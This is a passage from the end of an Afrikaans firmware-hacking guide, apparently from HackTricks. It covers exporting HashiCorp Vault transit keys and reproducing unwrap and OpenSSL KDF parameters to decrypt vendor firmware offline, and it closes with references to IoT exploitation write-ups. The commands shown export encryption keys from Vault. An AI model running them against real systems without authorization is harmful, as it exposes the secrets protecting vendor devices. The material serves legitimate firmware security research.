- Maak transit-sleutels slegs binne die geïsoleerde kloon uitvoerbaar: `vault write transit/keys/<name>/config exportable=true`
- Voer die unwrap-sleutel uit: `vault read transit/export/encryption-key/<name>`
- Probeer die herstelde RSA-sleutel met die presiese padding/hash-paar wat deur die KMS gebruik word. ’n Mislukte PKCS#1 v1.5-dekripsie en ’n mislukte verstek-OAEP-dekripsie bewys **nie** dat die sleutel verkeerd is nie; baie Vault-gesteunde vloei gebruik OAEP met SHA-256, terwyl algemene libraries SHA-1 as verstek gebruik.
- As die payload met `Salted__` begin, reproduseer die vendor se OpenSSL KDF presies (`EVP_BytesToKey`, dikwels MD5 op legacy-apparate) voordat AES-CBC-dekripsie probeer word.

Dit verander "encrypted firmware" in ’n meer algemene probleem: **herwin die appliance-kant se operasionele sleutels, en reproduseer dan die presiese unwrap + KDF-parameters offline**.

## Opleiding en Sertifisering

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## Verwysings

- [Cracking Firmware with Claude: Senior-Level Skill, Junior-Level Autonomy](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [Now You See mi: Now You're Pwned](https://labs.taszk.io/articles/post/nowyouseemi/)
- [Synacktiv - Exploiting the Tesla Wall Connector from its charge port connector - Part 2: bypassing the anti-downgrade](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [Make it Blink: Over-the-Air Exploitation of the Philips Hue Bridge](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)

{{#include ../../banners/hacktricks-training.md}}
